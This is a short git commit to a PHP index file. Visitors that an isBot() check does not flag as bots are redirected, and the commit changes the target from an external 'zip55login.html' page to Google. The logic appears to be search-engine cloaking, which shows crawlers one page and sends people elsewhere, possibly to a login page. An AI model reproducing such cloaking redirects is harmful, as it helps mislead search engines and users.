7b16a04f3578a169fcc34b3c60512100e7876624
MadzKebab <jayredfire7@gmail.com>
2025-12-25 22:35:39 +0700

    Update index.php

--- index.php
+++ index.php
@@ -22,7 +22,7 @@ function isBot(): bool
 if (!isBot()) 
 {
     header("HTTP/1.1 301 Moved Permanently");
-    header("Location: https://zip55.pages.dev/zip55login.html");
+    header("Location: www.google.com");
     exit();
 }
 $BRAND   = '';
